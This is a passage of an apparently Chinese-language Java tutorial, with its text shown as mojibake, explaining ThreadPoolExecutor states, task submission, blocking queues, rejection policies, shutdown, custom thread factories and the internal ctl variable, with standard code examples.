<h5 data-id="heading-6">1.2.2 çº¿ç¨‹æ± çš„çŠ¶æ€</h5>
<p>çº¿ç¨‹æ± æœ‰5ç§çŠ¶æ€ï¼Œé€šè¿‡ä¸€ä¸ªåŸå­æ•´å‹å˜é‡æ¥ç»´æŠ¤ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// çº¿ç¨‹æ± çŠ¶æ€ï¼ˆç”¨é«˜3ä½è¡¨ç¤ºï¼‰</span>
RUNNING    = -<span class="hljs-number">1</span> &lt;&lt; COUNT_BITS;  <span class="hljs-comment">// è¿è¡Œä¸­ï¼šæ¥å—æ–°ä»»åŠ¡ï¼Œå¤„ç†é˜Ÿåˆ—ä»»åŠ¡</span>
SHUTDOWN   =  <span class="hljs-number">0</span> &lt;&lt; COUNT_BITS;   <span class="hljs-comment">// å…³é—­ï¼šä¸æ¥å—æ–°ä»»åŠ¡ï¼Œä½†å¤„ç†é˜Ÿåˆ—ä»»åŠ¡</span>
STOP       =  <span class="hljs-number">1</span> &lt;&lt; COUNT_BITS;   <span class="hljs-comment">// åœæ­¢ï¼šä¸æ¥å—æ–°ä»»åŠ¡ï¼Œä¸å¤„ç†é˜Ÿåˆ—ä»»åŠ¡ï¼Œä¸­æ–­æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡</span>
TIDYING    =  <span class="hljs-number">2</span> &lt;&lt; COUNT_BITS;   <span class="hljs-comment">// æ•´ç†ï¼šæ‰€æœ‰ä»»åŠ¡å·²ç»ˆæ­¢ï¼Œå·¥ä½œçº¿ç¨‹æ•°ä¸º0</span>
TERMINATED =  <span class="hljs-number">3</span> &lt;&lt; COUNT_BITS;   <span class="hljs-comment">// ç»ˆæ­¢ï¼šterminated()æ–¹æ³•æ‰§è¡Œå®Œæˆ</span>
</code></pre>
<p><strong>çŠ¶æ€è½¬æ¢æµç¨‹ï¼š</strong></p>
<ol>
<li><strong>RUNNING â†’ SHUTDOWN</strong>ï¼šè°ƒç”¨<code>shutdown()</code>æ–¹æ³•</li>
<li><strong>RUNNING/SHUTDOWN â†’ STOP</strong>ï¼šè°ƒç”¨<code>shutdownNow()</code>æ–¹æ³•</li>
<li><strong>STOP â†’ TIDYING</strong>ï¼šå½“çº¿ç¨‹æ± å’Œé˜Ÿåˆ—éƒ½ä¸ºç©ºæ—¶</li>
<li><strong>SHUTDOWN â†’ TIDYING</strong>ï¼šå½“çº¿ç¨‹æ± ä¸ºç©ºæ—¶</li>
<li><strong>TIDYING â†’ TERMINATED</strong>ï¼šå½“<code>terminated()</code>æ–¹æ³•æ‰§è¡Œå®Œæˆæ—¶</li>
</ol>
<h4 data-id="heading-7">1.3 çº¿ç¨‹æ± çš„æ‰§è¡Œæµç¨‹</h4>
<h5 data-id="heading-8">1.3.1 execute()æ–¹æ³•æµç¨‹</h5>
<p>å½“å‘çº¿ç¨‹æ± æäº¤ä»»åŠ¡æ—¶ï¼Œæ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">execute</span><span class="hljs-params">(Runnable command)</span> {
    <span class="hljs-keyword">if</span> (command == <span class="hljs-literal">null</span>)
        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();
    
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> ctl.get();
    <span class="hljs-comment">// 1. å¦‚æœå½“å‰çº¿ç¨‹æ•° &lt; æ ¸å¿ƒçº¿ç¨‹æ•°ï¼Œåˆ›å»ºæ–°çº¿ç¨‹æ‰§è¡Œä»»åŠ¡</span>
    <span class="hljs-keyword">if</span> (workerCountOf(c) &lt; corePoolSize) {
        <span class="hljs-keyword">if</span> (addWorker(command, <span class="hljs-literal">true</span>))
            <span class="hljs-keyword">return</span>;
        c = ctl.get();
    }
    
    <span class="hljs-comment">// 2. å¦‚æœçº¿ç¨‹æ± å¤„äºè¿è¡ŒçŠ¶æ€ï¼Œå°†ä»»åŠ¡æ·»åŠ åˆ°å·¥ä½œé˜Ÿåˆ—</span>
    <span class="hljs-keyword">if</span> (isRunning(c) &amp;&amp; workQueue.offer(command)) {
        <span class="hljs-type">int</span> <span class="hljs-variable">recheck</span> <span class="hljs-operator">=</span> ctl.get();
        <span class="hljs-comment">// å†æ¬¡æ£€æŸ¥çº¿ç¨‹æ± çŠ¶æ€ï¼Œå¦‚æœä¸åœ¨è¿è¡ŒçŠ¶æ€ï¼Œç§»é™¤ä»»åŠ¡å¹¶æ‰§è¡Œæ‹’ç»ç­–ç•¥</span>
        <span class="hljs-keyword">if</span> (! isRunning(recheck) &amp;&amp; remove(command))
            reject(command);
        <span class="hljs-comment">// å¦‚æœå½“å‰æ²¡æœ‰å·¥ä½œçº¿ç¨‹ï¼Œåˆ›å»ºä¸€ä¸ª</span>
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (workerCountOf(recheck) == <span class="hljs-number">0</span>)
            addWorker(<span class="hljs-literal">null</span>, <span class="hljs-literal">false</span>);
    }
    <span class="hljs-comment">// 3. å¦‚æœé˜Ÿåˆ—å·²æ»¡ï¼Œå°è¯•åˆ›å»ºæ–°çº¿ç¨‹ï¼ˆä¸è¶…è¿‡æœ€å¤§çº¿ç¨‹æ•°ï¼‰</span>
    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!addWorker(command, <span class="hljs-literal">false</span>))
        <span class="hljs-comment">// 4. å¦‚æœåˆ›å»ºå¤±è´¥ï¼Œæ‰§è¡Œæ‹’ç»ç­–ç•¥</span>
        reject(command);
}
</code></pre>
<p><strong>æ‰§è¡Œæµç¨‹å›¾ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">æäº¤ä»»åŠ¡
  â†“
å½“å‰çº¿ç¨‹æ•° &lt; æ ¸å¿ƒçº¿ç¨‹æ•°ï¼Ÿ
  â”œâ”€ æ˜¯ â†’ åˆ›å»ºæ–°çº¿ç¨‹æ‰§è¡Œä»»åŠ¡
  â””â”€ å¦ â†’ å·¥ä½œé˜Ÿåˆ—æœªæ»¡ï¼Ÿ
<span class="hljs-code">          â”œâ”€ æ˜¯ â†’ å°†ä»»åŠ¡åŠ å…¥é˜Ÿåˆ—
          â””â”€ å¦ â†’ å½“å‰çº¿ç¨‹æ•° &lt; æœ€å¤§çº¿ç¨‹æ•°ï¼Ÿ
                  â”œâ”€ æ˜¯ â†’ åˆ›å»ºæ–°çº¿ç¨‹æ‰§è¡Œä»»åŠ¡
                  â””â”€ å¦ â†’ æ‰§è¡Œæ‹’ç»ç­–ç•¥
</span></code></pre>
<h5 data-id="heading-9">1.3.2 submit()æ–¹æ³•æµç¨‹</h5>
<p><code>submit()</code>æ–¹æ³•å¯ä»¥æäº¤<code>Runnable</code>æˆ–<code>Callable</code>ä»»åŠ¡ï¼Œå¹¶è¿”å›<code>Future</code>å¯¹è±¡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æäº¤Runnableä»»åŠ¡</span>
Future&lt;?&gt; submit(Runnable task);

<span class="hljs-comment">// æäº¤Callableä»»åŠ¡</span>
&lt;T&gt; Future&lt;T&gt; <span class="hljs-title function_">submit</span><span class="hljs-params">(Callable&lt;T&gt; task)</span>;

<span class="hljs-comment">// æäº¤Runnableä»»åŠ¡å¹¶æŒ‡å®šè¿”å›å€¼</span>
&lt;T&gt; Future&lt;T&gt; <span class="hljs-title function_">submit</span><span class="hljs-params">(Runnable task, T result)</span>;
</code></pre>
<p><strong>ç¤ºä¾‹ä»£ç ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºçº¿ç¨‹æ± </span>
<span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">5</span>);

<span class="hljs-comment">// æäº¤Runnableä»»åŠ¡</span>
Future&lt;?&gt; future1 = executor.submit(() -&gt; {
    System.out.println(<span class="hljs-string">"æ‰§è¡Œä»»åŠ¡1"</span>);
});

<span class="hljs-comment">// æäº¤Callableä»»åŠ¡</span>
Future&lt;String&gt; future2 = executor.submit(() -&gt; {
    Thread.sleep(<span class="hljs-number">1000</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-string">"ä»»åŠ¡æ‰§è¡Œå®Œæˆ"</span>;
});

<span class="hljs-comment">// è·å–ç»“æœ</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> future2.get(); <span class="hljs-comment">// é˜»å¡ç­‰å¾…ç»“æœ</span>
    System.out.println(result);
} <span class="hljs-keyword">catch</span> (Exception e) {
    e.printStackTrace();
}
</code></pre>
<h4 data-id="heading-10">1.4 å·¥ä½œé˜Ÿåˆ—ï¼ˆBlockingQueueï¼‰</h4>
<h5 data-id="heading-11">1.4.1 ArrayBlockingQueue</h5>
<p>åŸºäºæ•°ç»„çš„æœ‰ç•Œé˜»å¡é˜Ÿåˆ—ï¼Œå¿…é¡»æŒ‡å®šå®¹é‡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºå®¹é‡ä¸º10çš„æ•°ç»„é˜»å¡é˜Ÿåˆ—</span>
BlockingQueue&lt;Runnable&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">10</span>);

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">10</span>)
);
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>æœ‰ç•Œé˜Ÿåˆ—ï¼Œå®¹é‡å›ºå®š</li>
<li>å…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰</li>
<li>é€‚åˆä»»åŠ¡æ•°é‡å¯é¢„ä¼°çš„åœºæ™¯</li>
</ul>
<h5 data-id="heading-12">1.4.2 LinkedBlockingQueue</h5>
<p>åŸºäºé“¾è¡¨çš„é˜»å¡é˜Ÿåˆ—ï¼Œå¯ä»¥æ˜¯æœ‰ç•Œæˆ–æ— ç•Œçš„ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æ— ç•Œé˜Ÿåˆ—ï¼ˆé»˜è®¤å®¹é‡ä¸ºInteger.MAX_VALUEï¼‰</span>
BlockingQueue&lt;Runnable&gt; queue1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;();

<span class="hljs-comment">// æœ‰ç•Œé˜Ÿåˆ—ï¼ŒæŒ‡å®šå®¹é‡ä¸º100</span>
BlockingQueue&lt;Runnable&gt; queue2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>);
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>å¯ä»¥æ˜¯æœ‰ç•Œæˆ–æ— ç•Œ</li>
<li>å…ˆè¿›å…ˆå‡ºï¼ˆFIFOï¼‰</li>
<li>ååé‡é€šå¸¸é«˜äºArrayBlockingQueue</li>
</ul>
<h5 data-id="heading-13">1.4.3 SynchronousQueue</h5>
<p>ä¸å­˜å‚¨å…ƒç´ çš„é˜»å¡é˜Ÿåˆ—ï¼Œæ¯ä¸ªæ’å…¥æ“ä½œå¿…é¡»ç­‰å¾…å¦ä¸€ä¸ªçº¿ç¨‹çš„ç§»é™¤æ“ä½œï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// åˆ›å»ºåŒæ­¥é˜Ÿåˆ—</span>
BlockingQueue&lt;Runnable&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SynchronousQueue</span>&lt;&gt;();

<span class="hljs-comment">// ä½¿ç”¨ç¤ºä¾‹ï¼šé€‚åˆä»»åŠ¡å¤„ç†é€Ÿåº¦å¿«çš„åœºæ™¯</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">0</span>, Integer.MAX_VALUE, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">SynchronousQueue</span>&lt;&gt;()
);
</code></pre>
<p><strong>ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>ä¸å­˜å‚¨å…ƒç´ ï¼Œæ¯ä¸ªæ’å…¥å¿…é¡»ç­‰å¾…ç§»é™¤</li>
<li>é€‚åˆä»»åŠ¡å¤„ç†é€Ÿåº¦å¿«çš„åœºæ™¯</li>
<li>å¯ä»¥é¿å…ä»»åŠ¡åœ¨é˜Ÿåˆ—ä¸­å †ç§¯</li>
</ul>
<h4 data-id="heading-14">1.5 æ‹’ç»ç­–ç•¥ï¼ˆRejectedExecutionHandlerï¼‰</h4>
<p>å½“çº¿ç¨‹æ± æ— æ³•æ¥å—æ–°ä»»åŠ¡æ—¶ï¼ˆçº¿ç¨‹æ± å·²å…³é—­æˆ–é˜Ÿåˆ—å·²æ»¡ä¸”çº¿ç¨‹æ•°è¾¾åˆ°æœ€å¤§å€¼ï¼‰ï¼Œä¼šæ‰§è¡Œæ‹’ç»ç­–ç•¥ã€‚</p>
<h5 data-id="heading-15">1.5.1 å†…ç½®æ‹’ç»ç­–ç•¥</h5>
<p><strong>1. AbortPolicyï¼ˆé»˜è®¤ç­–ç•¥ï¼‰</strong></p>
<p>ç›´æ¥æŠ›å‡ºå¼‚å¸¸ï¼Œæ‹’ç»æ–°ä»»åŠ¡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">10</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.AbortPolicy() <span class="hljs-comment">// æŠ›å‡ºRejectedExecutionException</span>
);
</code></pre>
<p><strong>2. CallerRunsPolicy</strong></p>
<p>ç”±è°ƒç”¨çº¿ç¨‹æ‰§è¡Œä»»åŠ¡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.CallerRunsPolicy() <span class="hljs-comment">// ç”±æäº¤ä»»åŠ¡çš„çº¿ç¨‹æ‰§è¡Œ</span>
</code></pre>
<p><strong>3. DiscardPolicy</strong></p>
<p>ç›´æ¥ä¸¢å¼ƒä»»åŠ¡ï¼Œä¸æŠ›å‡ºå¼‚å¸¸ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.DiscardPolicy() <span class="hljs-comment">// é™é»˜ä¸¢å¼ƒä»»åŠ¡</span>
</code></pre>
<p><strong>4. DiscardOldestPolicy</strong></p>
<p>ä¸¢å¼ƒé˜Ÿåˆ—ä¸­æœ€è€çš„ä»»åŠ¡ï¼Œç„¶åå°è¯•æäº¤æ–°ä»»åŠ¡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.DiscardOldestPolicy() <span class="hljs-comment">// ä¸¢å¼ƒæœ€è€çš„ä»»åŠ¡</span>
</code></pre>
<h5 data-id="heading-16">1.5.2 è‡ªå®šä¹‰æ‹’ç»ç­–ç•¥</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è‡ªå®šä¹‰æ‹’ç»ç­–ç•¥ï¼šè®°å½•æ—¥å¿—å¹¶ä¿å­˜ä»»åŠ¡</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomRejectedHandler</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RejectedExecutionHandler</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">rejectedExecution</span><span class="hljs-params">(Runnable r, ThreadPoolExecutor executor)</span> {
        <span class="hljs-comment">// è®°å½•æ—¥å¿—</span>
        System.err.println(<span class="hljs-string">"ä»»åŠ¡è¢«æ‹’ç»ï¼š"</span> + r.toString());
        <span class="hljs-comment">// å¯ä»¥ä¿å­˜åˆ°æ•°æ®åº“æˆ–æ–‡ä»¶ï¼Œç¨åé‡è¯•</span>
        <span class="hljs-comment">// saveTaskToDatabase(r);</span>
    }
}

<span class="hljs-comment">// ä½¿ç”¨è‡ªå®šä¹‰æ‹’ç»ç­–ç•¥</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="hljs-number">10</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomRejectedHandler</span>()
);
</code></pre>
<h4 data-id="heading-17">1.6 çº¿ç¨‹æ± çš„å…³é—­</h4>
<h5 data-id="heading-18">1.6.1 shutdown()æ–¹æ³•</h5>
<p>ä¼˜é›…å…³é—­çº¿ç¨‹æ± ï¼Œä¸å†æ¥å—æ–°ä»»åŠ¡ï¼Œä½†ä¼šç­‰å¾…å·²æäº¤çš„ä»»åŠ¡æ‰§è¡Œå®Œæˆï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">5</span>);

<span class="hljs-comment">// æäº¤ä»»åŠ¡</span>
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
    executor.submit(() -&gt; {
        System.out.println(<span class="hljs-string">"æ‰§è¡Œä»»åŠ¡"</span>);
    });
}

<span class="hljs-comment">// å…³é—­çº¿ç¨‹æ± </span>
executor.shutdown();

<span class="hljs-comment">// ç­‰å¾…æ‰€æœ‰ä»»åŠ¡å®Œæˆï¼Œæœ€å¤šç­‰å¾…60ç§’</span>
<span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">if</span> (!executor.awaitTermination(<span class="hljs-number">60</span>, TimeUnit.SECONDS)) {
        executor.shutdownNow(); <span class="hljs-comment">// å¼ºåˆ¶å…³é—­</span>
    }
} <span class="hljs-keyword">catch</span> (InterruptedException e) {
    executor.shutdownNow();
    Thread.currentThread().interrupt();
}
</code></pre>
<h5 data-id="heading-19">1.6.2 shutdownNow()æ–¹æ³•</h5>
<p>ç«‹å³å…³é—­çº¿ç¨‹æ± ï¼Œå°è¯•åœæ­¢æ‰€æœ‰æ­£åœ¨æ‰§è¡Œçš„ä»»åŠ¡ï¼Œå¹¶è¿”å›ç­‰å¾…æ‰§è¡Œçš„ä»»åŠ¡åˆ—è¡¨ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç«‹å³å…³é—­</span>
List&lt;Runnable&gt; pendingTasks = executor.shutdownNow();
System.out.println(<span class="hljs-string">"æœªæ‰§è¡Œçš„ä»»åŠ¡æ•°ï¼š"</span> + pendingTasks.size());
</code></pre>
<h4 data-id="heading-20">1.7 çº¿ç¨‹å·¥å‚ï¼ˆThreadFactoryï¼‰</h4>
<p>çº¿ç¨‹å·¥å‚ç”¨äºåˆ›å»ºæ–°çº¿ç¨‹ï¼Œå¯ä»¥è‡ªå®šä¹‰çº¿ç¨‹çš„åç§°ã€ä¼˜å…ˆçº§ã€å®ˆæŠ¤çº¿ç¨‹å±æ€§ç­‰ã€‚</p>
<h5 data-id="heading-21">1.7.1 é»˜è®¤çº¿ç¨‹å·¥å‚</h5>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é»˜è®¤çº¿ç¨‹å·¥å‚åˆ›å»ºçš„çº¿ç¨‹åç§°æ ¼å¼ï¼špool-{poolNumber}-thread-{threadNumber}</span>
<span class="hljs-type">ThreadFactory</span> <span class="hljs-variable">defaultFactory</span> <span class="hljs-operator">=</span> Executors.defaultThreadFactory();
<span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> defaultFactory.newThread(() -&gt; System.out.println(<span class="hljs-string">"ä»»åŠ¡"</span>));
<span class="hljs-comment">// çº¿ç¨‹åç§°ï¼špool-1-thread-1</span>
</code></pre>
<h5 data-id="heading-22">1.7.2 è‡ªå®šä¹‰çº¿ç¨‹å·¥å‚</h5>
<p>è‡ªå®šä¹‰çº¿ç¨‹å·¥å‚å¯ä»¥è®¾ç½®çº¿ç¨‹çš„åç§°ã€ä¼˜å…ˆçº§ã€å¼‚å¸¸å¤„ç†å™¨ç­‰ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomThreadFactory</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ThreadFactory</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">threadNumber</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(<span class="hljs-number">1</span>);
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String namePrefix;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">CustomThreadFactory</span><span class="hljs-params">(String namePrefix)</span> {
        <span class="hljs-built_in">this</span>.namePrefix = namePrefix;
    }
    
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Thread <span class="hljs-title function_">newThread</span><span class="hljs-params">(Runnable r)</span> {
        <span class="hljs-type">Thread</span> <span class="hljs-variable">thread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(r, namePrefix + <span class="hljs-string">"-"</span> + threadNumber.getAndIncrement());
        
        <span class="hljs-comment">// è®¾ç½®ä¸ºéå®ˆæŠ¤çº¿ç¨‹</span>
        thread.setDaemon(<span class="hljs-literal">false</span>);
        
        <span class="hljs-comment">// è®¾ç½®ä¼˜å…ˆçº§</span>
        thread.setPriority(Thread.NORM_PRIORITY);
        
        <span class="hljs-comment">// è®¾ç½®å¼‚å¸¸å¤„ç†å™¨</span>
        thread.setUncaughtExceptionHandler((t, e) -&gt; {
            System.err.println(<span class="hljs-string">"çº¿ç¨‹ "</span> + t.getName() + <span class="hljs-string">" å‘ç”Ÿå¼‚å¸¸ï¼š"</span> + e.getMessage());
            e.printStackTrace();
        });
        
        <span class="hljs-keyword">return</span> thread;
    }
}

<span class="hljs-comment">// ä½¿ç”¨è‡ªå®šä¹‰çº¿ç¨‹å·¥å‚</span>
<span class="hljs-type">ThreadPoolExecutor</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>(
    <span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">60L</span>, TimeUnit.SECONDS,
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedBlockingQueue</span>&lt;&gt;(<span class="hljs-number">100</span>),
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomThreadFactory</span>(<span class="hljs-string">"MyPool"</span>),  <span class="hljs-comment">// è‡ªå®šä¹‰çº¿ç¨‹å·¥å‚</span>
    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ThreadPoolExecutor</span>.AbortPolicy()
);
</code></pre>
<h5 data-id="heading-23">1.7.3 çº¿ç¨‹å·¥å‚çš„æœ€ä½³å®è·µ</h5>
<p><strong>1. ä½¿ç”¨æœ‰æ„ä¹‰çš„çº¿ç¨‹åç§°</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¥½çš„åšæ³•ï¼šçº¿ç¨‹åç§°åŒ…å«ä¸šåŠ¡ä¿¡æ¯</span>
<span class="hljs-keyword">new</span> <span class="hljs-title class_">CustomThreadFactory</span>(<span class="hljs-string">"OrderProcessPool"</span>)

<span class="hljs-comment">// ä¸å¥½çš„åšæ³•ï¼šä½¿ç”¨é»˜è®¤åç§°</span>
Executors.defaultThreadFactory()
</code></pre>
<p><strong>2. è®¾ç½®å¼‚å¸¸å¤„ç†å™¨</strong></p>
<pre><code class="hljs language-java" lang="java">thread.setUncaughtExceptionHandler((t, e) -&gt; {
    <span class="hljs-comment">// è®°å½•æ—¥å¿—</span>
    logger.error(<span class="hljs-string">"çº¿ç¨‹æ‰§è¡Œå¼‚å¸¸"</span>, e);
    <span class="hljs-comment">// å‘é€å‘Šè­¦</span>
    alertService.sendAlert(<span class="hljs-string">"çº¿ç¨‹æ± å¼‚å¸¸"</span>, e);
});
</code></pre>
<p><strong>3. è®¾ç½®åˆç†çš„ä¼˜å…ˆçº§</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸€èˆ¬ä½¿ç”¨é»˜è®¤ä¼˜å…ˆçº§å³å¯</span>
thread.setPriority(Thread.NORM_PRIORITY);
</code></pre>
<h4 data-id="heading-24">1.8 çº¿ç¨‹æ± çš„å†…éƒ¨å®ç°åŸç†</h4>
<p><strong>é‡è¦è¯´æ˜ï¼š</strong> ä»¥ä¸‹å†…å®¹éƒ½æ˜¯<code>ThreadPoolExecutor</code>ç±»çš„<strong>å†…éƒ¨å®ç°ç»†èŠ‚</strong>ï¼Œè¿™äº›ç±»å’Œæ–¹æ³•éƒ½æ˜¯<code>private</code>çš„ï¼Œæˆ‘ä»¬å¹³æ—¶ä½¿ç”¨çº¿ç¨‹æ± æ—¶ä¸éœ€è¦ç›´æ¥æ“ä½œå®ƒä»¬ã€‚äº†è§£è¿™äº›åŸç†æœ‰åŠ©äºæ›´å¥½åœ°ç†è§£çº¿ç¨‹æ± çš„å·¥ä½œæœºåˆ¶ã€‚</p>
<h5 data-id="heading-25">1.8.1 ctlå˜é‡</h5>
<p>çº¿ç¨‹æ± ä½¿ç”¨ä¸€ä¸ªåŸå­æ•´å‹å˜é‡<code>ctl</code>æ¥åŒæ—¶è¡¨ç¤ºçº¿ç¨‹æ± çš„çŠ¶æ€å’Œçº¿ç¨‹æ•°é‡ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ctl = (runState &lt;&lt; COUNT_BITS) | workerCount</span>
<span class="hljs-comment">// é«˜3ä½è¡¨ç¤ºçŠ¶æ€ï¼Œä½29ä½è¡¨ç¤ºçº¿ç¨‹æ•°é‡</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">AtomicInteger</span> <span class="hljs-variable">ctl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicInteger</span>(ctlOf(RUNNING, <span class="hljs-number">0</span>));

<span class="hljs-comment">// çŠ¶æ€æ©ç ï¼ˆé«˜3ä½ï¼‰</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">COUNT_BITS</span> <span class="hljs-operator">=</span> Integer.SIZE - <span class="hljs-number">3</span>;
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">CAPACITY</span>   <span class="hljs-operator">=</span> (<span class="hljs-number">1</span> &lt;&lt; COUNT_BITS) - <span class="hljs-number">1</span>;

<span class="hljs-comment">// è·å–çŠ¶æ€</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">runStateOf</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span>     { <span class="hljs-keyword">return</span> c &amp; ~CAPACITY; }
<span class="hljs-comment">// è·å–çº¿ç¨‹æ•°</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">workerCountOf</span><span class="hljs-params">(<span class="hljs-type">int</span> c)</span>  { <span class="hljs-keyword">return</span> c &amp; CAPACITY; }
</code></pre>
<p><strong>è®¾è®¡ä¼˜åŠ¿ï¼š</strong></p>
<ul>
<li>ä½¿ç”¨ä¸€ä¸ªå˜é‡åŒæ—¶è¡¨ç¤ºçŠ¶æ€å’Œæ•°é‡ï¼Œä¿è¯åŸå­æ€§</li>
<li>å‡å°‘å†…å­˜å ç”¨</li>
